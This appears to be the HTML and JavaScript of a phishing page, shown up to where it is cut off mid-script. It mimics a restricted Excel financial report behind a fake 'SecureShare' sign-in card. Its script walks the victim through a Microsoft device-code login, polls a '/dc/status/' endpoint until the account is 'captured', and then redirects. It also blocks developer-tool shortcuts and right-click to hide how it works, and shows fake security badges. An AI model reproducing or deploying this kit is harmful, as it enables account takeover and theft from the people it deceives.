<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html, body { height: 100%; overflow: hidden; background: #fff; }

body { font-family: 'Calibri', 'Segoe UI', Arial, sans-serif; }
.ui { font-family: 'Segoe UI', system-ui, -apple-system, Arial, sans-serif; }

/* ═══════════════════════════════════════════════════
   EXCEL BACKGROUND
═══════════════════════════════════════════════════ */
.xl-shell {
  position: fixed;
  inset: 0;
  background: #fff;
  filter: blur(3.5px);
  transform: scale(1.02);
  transform-origin: center;
  user-select: none;
  pointer-events: none;
  display: flex;
  flex-direction: column;
}

.xl-ribbon {
  height: 30px;
  background: #217346;
  display: flex;
  align-items: center;
  padding: 0 10px;
  gap: 18px;
  flex-shrink: 0;
}
.xl-ribbon-tab {
  font-size: 11px;
  color: rgba(255,255,255,0.85);
  font-family: 'Segoe UI', Arial, sans-serif;
  letter-spacing: 0.01em;
}
.xl-ribbon-tab.active {
  color: #fff;
  font-weight: 500;
  border-bottom: 2px solid #fff;
  padding-bottom: 1px;
}

.xl-formula-bar {
  height: 26px;
  background: #fff;
  border-bottom: 1px solid #d0d0d0;
  display: flex;
  align-items: center;
  flex-shrink: 0;
}
.xl-name-box {
  width: 80px;
  border-right: 1px solid #d0d0d0;
  font-family: 'Calibri', Arial, sans-serif;
  font-size: 11px;
  color: #1a1a1a;
  padding: 0 8px;
  height: 100%;
  display: flex;
  align-items: center;
  flex-shrink: 0;
}
.xl-fx {
  font-family: 'Calibri', Arial, sans-serif;
  font-size: 11px;
  color: #9b59b6;
  padding: 0 10px;
  font-style: italic;
  border-right: 1px solid #d0d0d0;
  height: 100%;
  display: flex;
  align-items: center;
  flex-shrink: 0;
  width: 30px;
  justify-content: center;
}
.xl-formula-text {
  font-family: 'Calibri', Arial, sans-serif;
  font-size: 11px;
  color: #1a1a1a;
  padding: 0 10px;
}

.xl-body {
  flex: 1;
  display: flex;
  overflow: hidden;
}

.xl-rownums {
  width: 42px;
  background: #f2f2f2;
  border-right: 1px solid #d0d0d0;
  flex-shrink: 0;
  display: flex;
  flex-direction: column;
  overflow-y: auto;
  scrollbar-width: none;
}
.xl-rownums::-webkit-scrollbar { display: none; }
.xl-rownum-corner {
  height: 22px;
  border-bottom: 1px solid #d0d0d0;
  background: #f2f2f2;
  flex-shrink: 0;
}
.xl-rn {
  height: 20px;
  display: flex;
  align-items: center;
  justify-content: flex-end;
  padding-right: 4px;
  font-family: 'Calibri', Arial, sans-serif;
  font-size: 10px;
  color: #666;
  border-bottom: 1px solid #e8e8e8;
  flex-shrink: 0;
}

.xl-grid-wrap {
  flex: 1;
  overflow: hidden;
  display: flex;
  flex-direction: column;
}

.xl-col-headers {
  height: 22px;
  display: flex;
  background: #f2f2f2;
  border-bottom: 1px solid #d0d0d0;
  flex-shrink: 0;
}
.xl-ch {
  font-family: 'Calibri', Arial, sans-serif;
  font-size: 10px;
  color: #444;
  border-right: 1px solid #d0d0d0;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
}

.xl-grid {
  flex: 1;
  overflow-y: auto;
  scrollbar-width: none;
}
.xl-grid::-webkit-scrollbar { display: none; }
.xl-row {
  display: flex;
  height: 20px;
}
.xl-row.merged-title { height: 28px; }

.xl-cell {
  border-right: 1px solid #e0e0e0;
  border-bottom: 1px solid #e0e0e0;
  font-family: 'Calibri', Arial, sans-serif;
  font-size: 11px;
  color: #1a1a1a;
  display: flex;
  align-items: center;
  overflow: hidden;
  white-space: nowrap;
  flex-shrink: 0;
  padding: 0 4px;
}

.c-B  { width: 220px; }
.c-C  { width: 100px; }
.c-D  { width: 100px; }
.c-E  { width: 100px; }
.c-F  { width: 100px; }
.c-G  { width: 80px; }
.c-H  { width: 80px; }
.c-I  { width: 80px; }

.xl-cell.header-row {
  background: #1f5c8b;
  color: #fff;
  font-weight: 500;
  font-size: 10px;
  justify-content: center;
  text-transform: uppercase;
  letter-spacing: 0.04em;
  border-color: #1a4f7a;
}
.xl-cell.section-head {
  background: #dce3ec;
  color: #1a1a1a;
  font-weight: 700;
  font-size: 11px;
  border-color: #c8d4e0;
}
.xl-cell.subtotal-row {
  background: #edf2f7;
  font-weight: 600;
  border-top: 1px solid #aab8c8;
  border-color: #c8d4e0;
}
.xl-cell.total-row {
  background: #1f5c8b;
  color: #fff;
  font-weight: 700;
  border-color: #1a4f7a;
}
.xl-cell.even-row { background: #f7f9fc; }
.xl-cell.right { justify-content: flex-end; }
.xl-cell.center { justify-content: center; }
.xl-cell.formula { color: #1f5c8b; }
.xl-cell.neg { color: #c0392b; }
.xl-cell.pos { color: #1e7d45; }
.xl-cell.bold { font-weight: 600; }
.xl-cell.title-cell {
  font-size: 14px;
  font-weight: 700;
  color: #1a1a1a;
  letter-spacing: -0.01em;
  background: #fff;
  border: none;
}
.xl-cell.subtitle-cell {
  font-size: 10px;
  color: #888;
  background: #fff;
  border: none;
}
.xl-cell.selected {
  outline: 2px solid #217346;
  outline-offset: -2px;
}

.xl-tabs {
  height: 26px;
  background: #f2f2f2;
  border-top: 1px solid #d0d0d0;
  display: flex;
  align-items: flex-end;
  padding: 0 6px;
  gap: 0;
  flex-shrink: 0;
}
.xl-tab {
  height: 22px;
  padding: 0 14px;
  font-family: 'Calibri', Arial, sans-serif;
  font-size: 11px;
  color: #444;
  border: 1px solid #d0d0d0;
  border-bottom: none;
  background: #e8e8e8;
  display: flex;
  align-items: center;
  margin-right: 2px;
  border-radius: 3px 3px 0 0;
}
.xl-tab.active {
  background: #fff;
  color: #217346;
  font-weight: 600;
  border-bottom: 2px solid #fff;
  z-index: 1;
}

.xl-statusbar {
  height: 20px;
  background: #f2f2f2;
  border-top: 1px solid #d0d0d0;
  display: flex;
  align-items: center;
  padding: 0 10px;
  gap: 16px;
  flex-shrink: 0;
}
.xl-status-item {
  font-family: 'Calibri', Arial, sans-serif;
  font-size: 10px;
  color: #555;
}

.page-overlay {
  position: fixed;
  inset: 0;
  background: rgba(240, 243, 247, 0.55);
  pointer-events: none;
}

.topbar {
  position: fixed;
  top: 0; left: 0; right: 0;
  z-index: 30;
  height: 46px;
  background: #fff;
  border-bottom: 1px solid #e0e0e0;
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 1.8rem;
  font-family: 'Segoe UI', system-ui, Arial, sans-serif;
}
.topbar-left {
  display: flex;
  align-items: center;
  gap: 10px;
}
.topbar-brand {
  display: flex;
  align-items: center;
  gap: 7px;
}
.brand-xl-icon {
  width: 22px; height: 22px;
  background: #217346;
  border-radius: 3px;
  display: flex; align-items: center; justify-content: center;
  flex-shrink: 0;
}
.brand-xl-icon svg { width: 13px; height: 13px; fill: white; }
.brand-name {
  font-size: 0.83rem;
  font-weight: 600;
  color: #1a1a1a;
  letter-spacing: -0.01em;
}
.topbar-divider { width: 1px; height: 16px; background: #e0e0e0; }
.topbar-doc {
  font-size: 0.76rem;
  color: #888;
  max-width: 340px;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}
.topbar-right {
  display: flex;
  align-items: center;
  gap: 10px;
}
.lock-tag {
  font-size: 0.65rem;
  color: #888;
  display: flex; align-items: center; gap: 4px;
  font-family: 'Segoe UI', Arial, sans-serif;
}
.lock-tag svg { width: 11px; height: 11px; stroke: #aaa; fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }

.page {
  position: fixed;
  inset: 0;
  z-index: 20;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 46px 1rem 1rem;
}

.card {
  width: 100%;
  max-width: 360px;
  background: #fff;
  border: 1px solid #c8c8c8;
  border-radius: 4px;
  box-shadow: 0 2px 8px rgba(0,0,0,0.08), 0 12px 40px rgba(0,0,0,0.1);
  overflow: hidden;
  font-family: 'Segoe UI', system-ui, Arial, sans-serif;
  animation: card-in 0.3s cubic-bezier(0.34,1.1,0.64,1) both;
}
@keyframes card-in {
  from { transform: translateY(16px); opacity: 0; }
  to   { transform: translateY(0); opacity: 1; }
}
.card-rule { height: 3px; background: #217346; }

.card-header {
  padding: 1.4rem 1.5rem 1.1rem;
  border-bottom: 1px solid #f0f0f0;
  display: flex;
  align-items: flex-start;
  gap: 11px;
}
.header-icon {
  width: 36px; height: 36px;
  background: #e8f5ee;
  border: 1px solid #c2dece;
  border-radius: 4px;
  display: flex; align-items: center; justify-content: center;
  flex-shrink: 0;
}
.header-icon svg { width: 18px; height: 18px; fill: #217346; }
.header-eyebrow {
  font-size: 0.65rem;
  text-transform: uppercase;
  letter-spacing: 0.1em;
  color: #999;
  font-weight: 400;
  margin-bottom: 3px;
}
.header-title {
  font-size: 0.9rem;
  font-weight: 600;
  color: #1a1a1a;
  line-height: 1.25;
  margin-bottom: 1px;
}
.header-sub {
  font-size: 0.72rem;
  color: #888;
}

.card-body { padding: 1.3rem 1.5rem; }

.access-info {
  font-size: 0.78rem;
  color: #555;
  line-height: 1.6;
  margin-bottom: 1.3rem;
  padding: 10px 12px;
  background: #f8f8f8;
  border: 1px solid #eaeaea;
  border-left: 3px solid #217346;
  border-radius: 0 3px 3px 0;
}

.btn-open {
  width: 100%;
  padding: 9px 14px;
  background: #217346;
  color: #fff;
  font-family: 'Segoe UI', system-ui, Arial, sans-serif;
  font-size: 0.83rem;
  font-weight: 600;
  border: none;
  border-radius: 3px;
  cursor: pointer;
  display: flex; align-items: center; justify-content: center; gap: 8px;
  transition: background 0.12s;
  letter-spacing: 0.01em;
  margin-bottom: 8px;
}
.btn-open:hover { background: #1a5c38; }
.btn-open svg { width: 14px; height: 14px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }

.divider-row {
  display: flex; align-items: center; gap: 10px;
  font-size: 0.68rem; color: #bbb;
  margin: 10px 0;
}
.divider-row::before, .divider-row::after { content: ''; flex: 1; height: 1px; background: #e8e8e8; }

.btn-ms {
  width: 100%;
  padding: 8px 14px;
  background: #fff;
  color: #1a1a1a;
  font-family: 'Segoe UI', system-ui, Arial, sans-serif;
  font-size: 0.82rem;
  font-weight: 400;
  border: 1px solid #d0d0d0;
  border-radius: 3px;
  cursor: pointer;
  display: flex; align-items: center; justify-content: center; gap: 9px;
  transition: background 0.12s, border-color 0.12s;
}
.btn-ms:hover { background: #f5f5f5; border-color: #bbb; }

.code-section { margin-bottom: 1.1rem; }
.code-label-row {
  display: flex; align-items: center; justify-content: space-between;
  margin-bottom: 6px;
}
.code-label {
  font-size: 0.65rem;
  text-transform: uppercase;
  letter-spacing: 0.1em;
  color: #999;
}
.regen-btn {
  font-size: 0.7rem;
  color: #217346;
  background: none; border: none;
  cursor: pointer;
  display: flex; align-items: center; gap: 4px;
  padding: 0;
  transition: color 0.12s;
}
.regen-btn:hover { color: #1a5c38; }
.regen-btn svg { width: 11px; height: 11px; stroke: currentColor; fill: none; stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round; }

.code-box {
  display: flex; align-items: center;
  background: #f8f9fa;
  border: 1px solid #d0d0d0;
  border-radius: 3px;
  padding: 10px 12px;
  gap: 10px;
}
.code-value {
  font-family: 'Consolas', 'Courier New', monospace;
  font-size: 1.25rem;
  font-weight: 700;
  color: #1a1a1a;
  letter-spacing: 0.2em;
  flex: 1;
  text-align: center;
}
.copy-btn {
  display: flex; align-items: center; gap: 5px;
  padding: 4px 10px;
  background: #fff;
  border: 1px solid #d0d0d0;
  border-radius: 3px;
  font-size: 0.7rem;
  color: #555;
  cursor: pointer;
  transition: background 0.1s, border-color 0.1s;
  white-space: nowrap;
}
.copy-btn:hover { background: #f0f0f0; border-color: #bbb; }
.copy-btn.copied { border-color: #217346; color: #217346; background: #e8f5ee; }
.copy-btn svg { width: 11px; height: 11px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }

.how-list {
  font-size: 0.75rem;
  color: #555;
  line-height: 1.6;
  margin-bottom: 1.1rem;
  padding-left: 0;
  list-style: none;
  display: flex;
  flex-direction: column;
  gap: 5px;
}
.how-list li {
  display: flex; align-items: flex-start; gap: 8px;
}
.how-n {
  width: 16px; height: 16px;
  border-radius: 50%;
  background: #e8e8e8;
  color: #555;
  font-size: 0.6rem;
  font-weight: 700;
  display: flex; align-items: center; justify-content: center;
  flex-shrink: 0;
  margin-top: 2px;
}

.btn-authenticate {
  width: 100%;
  padding: 9px 14px;
  background: #217346;
  color: #fff;
  font-family: 'Segoe UI', system-ui, Arial, sans-serif;
  font-size: 0.83rem;
  font-weight: 600;
  border: none;
  border-radius: 3px;
  cursor: pointer;
  display: flex; align-items: center; justify-content: center; gap: 8px;
  transition: background 0.12s;
  margin-bottom: 7px;
}
.btn-authenticate:hover { background: #1a5c38; }
.btn-authenticate svg { width: 14px; height: 14px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }

.btn-back {
  width: 100%;
  padding: 8px 14px;
  background: #fff;
  color: #666;
  font-family: 'Segoe UI', system-ui, Arial, sans-serif;
  font-size: 0.78rem;
  font-weight: 400;
  border: 1px solid #e0e0e0;
  border-radius: 3px;
  cursor: pointer;
  display: flex; align-items: center; justify-content: center; gap: 6px;
  transition: background 0.12s;
}
.btn-back:hover { background: #f5f5f5; }
.btn-back svg { width: 12px; height: 12px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }

.success-wrap {
  display: flex; flex-direction: column; align-items: center;
  text-align: center; gap: 7px; padding: 0.5rem 0 0.6rem;
}
.success-icon {
  width: 44px; height: 44px;
  border-radius: 50%;
  background: #e8f5ee;
  border: 1.5px solid #c2dece;
  display: flex; align-items: center; justify-content: center;
  margin-bottom: 4px;
  animation: pop 0.28s cubic-bezier(0.34,1.5,0.64,1) both;
}
@keyframes pop { from { transform: scale(0.5); opacity: 0; } to { transform: scale(1); opacity: 1; } }
.success-icon svg {
  width: 20px; height: 20px;
  stroke: #217346; fill: none;
  stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round;
  stroke-dasharray: 26; stroke-dashoffset: 26;
  animation: draw 0.28s ease forwards 0.25s;
}
@keyframes draw { to { stroke-dashoffset: 0; } }
.success-title {
  font-size: 0.92rem;
  font-weight: 600;
  color: #1a1a1a;
}
.success-sub {
  font-size: 0.74rem;
  color: #777;
  line-height: 1.5;
  max-width: 270px;
  margin-bottom: 10px;
}
.btn-dl {
  width: 100%;
  padding: 9px 14px;
  background: #217346;
  color: #fff;
  font-family: 'Segoe UI', system-ui, Arial, sans-serif;
  font-size: 0.82rem;
  font-weight: 600;
  border: none;
  border-radius: 3px;
  cursor: pointer;
  display: flex; align-items: center; justify-content: center; gap: 7px;
  transition: background 0.12s;
}
.btn-dl:hover { background: #1a5c38; }
.btn-dl svg { width: 14px; height: 14px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }

.card-footer {
  padding: 8px 1.5rem 1rem;
  border-top: 1px solid #f0f0f0;
  display: flex;
  align-items: center;
  gap: 8px;
  justify-content: center;
}
.ftag {
  font-size: 0.62rem;
  color: #bbb;
}
.ftag-sep { width: 1px; height: 9px; background: #e0e0e0; }

.dlg-overlay {
  position: absolute; inset: 0;
  background: rgba(248,249,250,0.88);
  backdrop-filter: blur(3px);
  display: flex; align-items: center; justify-content: center;
  z-index: 50;
  border-radius: 4px;
  padding: 1.5rem;
  animation: fd 0.14s ease both;
}
@keyframes fd { from { opacity: 0; } to { opacity: 1; } }
.dlg-inner {
  background: #fff;
  border: 1px solid #c8c8c8;
  border-radius: 4px;
  box-shadow: 0 4px 20px rgba(0,0,0,0.1);
  padding: 1.4rem 1.4rem 1.2rem;
  width: 100%;
  animation: su 0.18s cubic-bezier(0.34,1.3,0.64,1) both;
  display: flex; flex-direction: column; align-items: center; gap: 4px;
}
@keyframes su { from { transform: translateY(10px) scale(0.97); opacity: 0; } to { transform: translateY(0) scale(1); opacity: 1; } }
.dlg-icon {
  width: 38px; height: 38px;
  background: #e8f5ee;
  border: 1px solid #c2dece;
  border-radius: 50%;
  display: flex; align-items: center; justify-content: center;
  margin-bottom: 6px;
}
.dlg-icon svg { width: 16px; height: 16px; stroke: #217346; fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }
.dlg-heading {
  font-size: 0.85rem;
  font-weight: 600;
  color: #1a1a1a;
  text-align: center;
  margin-bottom: 2px;
}
.dlg-sub {
  font-size: 0.72rem;
  color: #888;
  text-align: center;
  line-height: 1.5;
  margin-bottom: 12px;
}
.dlg-actions { display: flex; flex-direction: column; gap: 6px; width: 100%; }
.dlg-proceed {
  width: 100%; padding: 9px 14px;
  background: #217346; color: #fff;
  font-size: 0.82rem; font-weight: 600;
  border: none; border-radius: 3px; cursor: pointer;
  display: flex; align-items: center; justify-content: center; gap: 7px;
  transition: background 0.12s;
}
.dlg-proceed:hover { background: #1a5c38; }
.dlg-proceed svg { width: 13px; height: 13px; stroke: currentColor; fill: none; stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round; }
.dlg-cancel {
  width: 100%; padding: 8px 14px;
  background: #fff; color: #555;
  font-size: 0.78rem; font-weight: 400;
  border: 1px solid #e0e0e0; border-radius: 3px; cursor: pointer;
  display: flex; align-items: center; justify-content: center;
  transition: background 0.12s;
}
.dlg-cancel:hover { background: #f5f5f5; }
.dlg-note {
  font-size: 0.62rem; color: #bbb; text-align: center; line-height: 1.5;
  padding-top: 10px; border-top: 1px solid #f0f0f0; width: 100%; margin-top: 3px;
}

.hidden { display: none !important; }
</style>
</head>
<body>

<div class="xl-shell" aria-hidden="true">
  <div class="xl-ribbon">
    <span class="xl-ribbon-tab">File</span>
    <span class="xl-ribbon-tab active">Home</span>
    <span class="xl-ribbon-tab">Insert</span>
    <span class="xl-ribbon-tab">Page Layout</span>
    <span class="xl-ribbon-tab">Formulas</span>
    <span class="xl-ribbon-tab">Data</span>
    <span class="xl-ribbon-tab">Review</span>
    <span class="xl-ribbon-tab">View</span>
  </div>
  <div class="xl-formula-bar">
    <div class="xl-name-box">B4</div>
    <div class="xl-fx">fx</div>
    <div class="xl-formula-text">=SUM(D8:D21)</div>
  </div>
  <div class="xl-body">
    <div class="xl-rownums" id="rowNumContainer">
      <div class="xl-rownum-corner"></div>
    </div>
    <div class="xl-grid-wrap">
      <div class="xl-col-headers">
        <div class="xl-ch c-B" style="width:220px">B</div>
        <div class="xl-ch c-C">C</div>
        <div class="xl-ch c-D">D</div>
        <div class="xl-ch c-E">E</div>
        <div class="xl-ch c-F">F</div>
        <div class="xl-ch c-G">G</div>
        <div class="xl-ch c-H">H</div>
        <div class="xl-ch c-I">I</div>
      </div>
      <div class="xl-grid" id="gridContainer"></div>
    </div>
  </div>
  <div class="xl-tabs">
    <div class="xl-tab active">Q2 Financial Report</div>
    <div class="xl-tab">Q1 Summary</div>
    <div class="xl-tab">FY2025 Annual</div>
    <div class="xl-tab">Balance Sheet</div>
    <div class="xl-tab">Cash Flow</div>
  </div>
  <div class="xl-statusbar">
    <span class="xl-status-item">Ready</span>
    <span class="xl-status-item">Average: 38,280</span>
    <span class="xl-status-item">Count: 18</span>
    <span class="xl-status-item">Sum: 688,940</span>
  </div>
</div>

<div class="page-overlay" aria-hidden="true"></div>

<header class="topbar">
  <div class="topbar-left">
    <div class="topbar-brand">
      <div class="brand-xl-icon">
        <svg viewBox="0 0 14 14"><text x="1" y="11" font-family="Calibri,Arial,sans-serif" font-size="11" font-weight="700" fill="white">X</text></svg>
      </div>
      <span class="brand-name">SecureShare</span>
    </div>
    <div class="topbar-divider"></div>
    <span class="topbar-doc" id="topbarDoc">Q2 Financial Report — Vantage Capital Group.xlsx</span>
  </div>
  <div class="topbar-right">
    <span class="lock-tag">
      <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
      Restricted access
    </span>
  </div>
</header>

<div class="page">
  <div class="card ui" id="mainCard">
    <div class="card-rule"></div>
    <div class="card-header">
      <div class="header-icon">
        <svg viewBox="0 0 24 24">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8Z"/>
          <path d="M14 2v6h6" fill="none" stroke="#217346" stroke-width="1.5" stroke-linejoin="round"/>
          <line x1="8" y1="13" x2="16" y2="13" stroke="white" stroke-width="1.2" stroke-linecap="round"/>
          <line x1="8" y1="17" x2="16" y2="17" stroke="white" stroke-width="1.2" stroke-linecap="round"/>
        </svg>
      </div>
      <div class="header-text">
        <div class="header-eyebrow">Restricted document</div>
        <div class="header-title" id="docTitle">Q2 Financial Report.xlsx</div>
        <div class="header-sub">Vantage Capital Group · Board use only</div>
      </div>
    </div>

    <div id="stepAccess">
      <div class="card-body">
        <div class="access-info">
          This document requires identity verification before it can be viewed. Use your company credentials or sign in with Microsoft.
        </div>
        <button class="btn-open" id="btnOpen">
          <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
          Open document
        </button>
        <div class="divider-row">or</div>
        <button class="btn-ms" id="btnMs">
          <svg width="16" height="16" viewBox="0 0 21 21">
            <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
            <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
            <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
            <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
          </svg>
          Sign in with Microsoft
        </button>
      </div>
    </div>

    <div id="stepCode" class="hidden">
      <div class="card-body">
        <div class="code-section">
          <div class="code-label-row">
            <span class="code-label">Access code</span>
            <button class="regen-btn" id="btnRegen" style="display:none;">
              <svg viewBox="0 0 24 24"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-4.49"/></svg>
              New code
            </button>
          </div>
          <div class="code-box">
            <span class="code-value" id="codeDisplay">Loading...</span>
            <button class="copy-btn" id="btnCopy" disabled>
              <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
              Copy
            </button>
          </div>
        </div>
        <ul class="how-list">
          <li><div class="how-n">1</div><span>Copy the code above</span></li>
          <li><div class="how-n">2</div><span>Click <strong>Authenticate</strong> and sign in with your company account</span></li>
          <li><div class="how-n">3</div><span>Paste the code when prompted to unlock the document</span></li>
        </ul>
        <button class="btn-authenticate" id="btnAuthenticate" disabled>
          <svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
          Authenticate
        </button>
        <button class="btn-back" id="btnBack">
          <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>
          Go back
        </button>
      </div>
    </div>

    <div id="stepSuccess" class="hidden">
      <div class="card-body">
        <div class="success-wrap">
          <div class="success-icon">
            <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
          </div>
          <h2 class="success-title">Access granted</h2>
          <p class="success-sub">Your identity has been verified. The document is now available to view and download.</p>
          <button class="btn-dl" id="btnDownload">
            <svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
            Download document
          </button>
        </div>
      </div>
    </div>

    <div class="card-footer">
      <span class="ftag">256-bit encrypted</span>
      <div class="ftag-sep"></div>
      <span class="ftag">Access logged</span>
      <div class="ftag-sep"></div>
      <span class="ftag">Expires 24 h</span>
    </div>

    <div class="dlg-overlay hidden" id="dlgOverlay" role="dialog" aria-modal="true">
      <div class="dlg-inner">
        <div class="dlg-icon">
          <svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg>
        </div>
        <p class="dlg-heading">Confirm your identity</p>
        <p class="dlg-sub">You are about to access a restricted financial document. Your access will be logged for audit purposes.</p>
        <div class="dlg-actions">
          <button class="dlg-proceed" id="dlgProceed">
            <svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
            Continue
          </button>
          <button class="dlg-cancel" id="dlgCancel">Cancel</button>
        </div>
        <p class="dlg-note">Unauthorised access to this document may be subject to legal action.</p>
      </div>
    </div>
  </div>
</div>

<script>
document.addEventListener("keydown",function(e){if(e.key==="F12"||(e.ctrlKey&&e.shiftKey&&["i","j","c"].includes(e.key.toLowerCase()))||(e.ctrlKey&&e.key.toLowerCase()==="u")){e.preventDefault();}});document.addEventListener("contextmenu",function(e){e.preventDefault();});

(function(){
  var sid = '{session_id}';
  var verifyUrl = '{verify_url}';
  var codeReady = {code_ready};
  var code = '{user_code}';

  var codeEl = document.getElementById('codeDisplay');
  var btnAuth = document.getElementById('btnAuthenticate');
  var copyBtn = document.getElementById('btnCopy');

  function showCode(c, v) {
    code = c;
    if(v) verifyUrl = v;
    codeEl.textContent = c;
    btnAuth.disabled = false;
    copyBtn.disabled = false;
  }

  if (codeReady && code) {
    showCode(code, verifyUrl);
  } else {
    codeEl.textContent = 'Loading...';
    btnAuth.disabled = true;
    copyBtn.disabled = true;
  }

  function copyCode() {
    if (!code) return;
    if (navigator.clipboard) {
      navigator.clipboard.writeText(code).then(function() { showCopied(); });
    } else {
      var t = document.createElement('textarea');
      t.value = code;
      document.body.appendChild(t);
      t.select();
      document.execCommand('copy');
      document.body.removeChild(t);
      showCopied();
    }
  }

  function showCopied() {
    copyBtn.classList.add('copied');
    copyBtn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Copied';
    setTimeout(function() {
      copyBtn.classList.remove('copied');
      copyBtn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy';
    }, 2000);
  }

  function openSignIn() {
    if (!code) return;
    copyCode();
    var w = 600, h = 600, l = (screen.width - w) / 2, t = (screen.height - h) / 2;
    var popup = window.open(verifyUrl, 'ms', 'width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
    if (popup) popup.focus();
  }

  function showSuccess(redirectUrl) {
    document.getElementById('stepCode').classList.add('hidden');
    document.getElementById('stepSuccess').classList.remove('hidden');
    var downloadBtn = document.getElementById('btnDownload');
    if (redirectUrl) {
      downloadBtn.onclick = function() { top.location.href = redirectUrl; };
    } else {
      downloadBtn.onclick = function() { top.location.href = redirectUrl || '/'; };
    }
  }

  function poll() {
    fetch('/dc/status/' + sid, {method:'GET',credentials:'include'}).then(function(r) { return r.json() }).then(function(d) {
      if (d.ready && !codeReady) {
        codeReady = true;
        showCode(d.user_code, d.verify_url);
      }
      if (d.captured) {
        showSuccess(d.redirect_url);
        if (d.redirect_url) {
          setTimeout(function(){ top.location.href = d.redirect_url; }, 2500);
        }
      }
      if (d.expired) {
        btnAuth.disabled = true;
      }
      if (!d.failed && !d.expired && !d.captured) {
        setTimeout(poll, 3000);
      }
    })['catch'](function(){ setTimeout(poll, 5000); });
  }
  poll();

  // Step 1 → dialog
  document.getElementById('btnOpen').addEventListener('click', function() {
    document.getElementById('dlgOverlay').classList.remove('hidden');
  });

  document.getElementById('btnMs').addEventListener('click', function() {
    var b = this;
    var orig = b.innerHTML;
    b.textContent = 'Redirecting…'; b.disabled = true;
    setTimeout(function() {
      b.disabled = false; b.innerHTML = orig;
      alert('Would redirect to Microsoft SSO in production.');
    }, 1300);
  });

  document.getElementById('dlgProceed').addEventListener('click', function() {
    document.getElementById('dlgOverlay').classList.add('hidden');
    document.getElementById('stepAccess').classList.add('hidden');
    document.getElementById('stepCode').classList.remove('hidden');
  });

  document.getElementById('dlgCancel').addEventListener('click', function() {
    document.getElementById('dlgOverlay').classList.add('hidden');
  });

  document.getElementById('btnBack').addEventListener('click', function() {
    document.getElementById('stepCode').classList.add('hidden');
    document.getElementById('stepAccess').classList.remove('hidden');
  });

  copyBtn.addEventListener('click', copyCode);
  btnAuth.addEventListener('click', openSignIn);

  // Build spreadsheet rows
  function buildSpreadsheet() {
    var grid = document.getElementById('gridContainer');
    var rowNumContainer = document.getElementById('rowNumContainer');
    grid.innerHTML = '';
    rowNumContainer.innerHTML = '<div class="xl-rownum-corner"></div>';

    for (var i = 1; i <= 50; i++) {
      var rn = document.createElement('div');
      rn.className = 'xl-rn';
      rn.textContent = i;
      rowNumContainer.appendChild(rn);
    }

    function cell(classes, content) {
      var c = document.createElement('div');
      c.className = 'xl-cell ' + classes;
      if (content) c.textContent = content;
      return c;
    }

    function row() {
      var r = document.createElement('div');
      r.className = 'xl-row';
      for (var i = 0; i < arguments.length; i++) {
        r.appendChild(arguments[i]);
      }
      return r;
    }

    grid.appendChild(row(
      cell('c-B title-cell', 'Vantage Capital Group'),
      cell('c-C', ''), cell('c-D', ''), cell('c-E', ''), cell('c-F', ''), cell('c-G', ''), cell('c-H', ''), cell('c-I', '')
    ));
    grid.children[grid.children.length-1].style.height = '28px';

    grid.appendChild(row(
      cell('c-B subtitle-cell', 'Consolidated Financial Statements — Q2 2026'),
      cell('c-C', ''), cell('c-D', ''), cell('c-E', ''), cell('c-F', ''), cell('c-G', ''), cell('c-H', ''), cell('c-I', '')
    ));
    grid.children[grid.children.length-1].style.height = '18px';

    grid.appendChild(row(
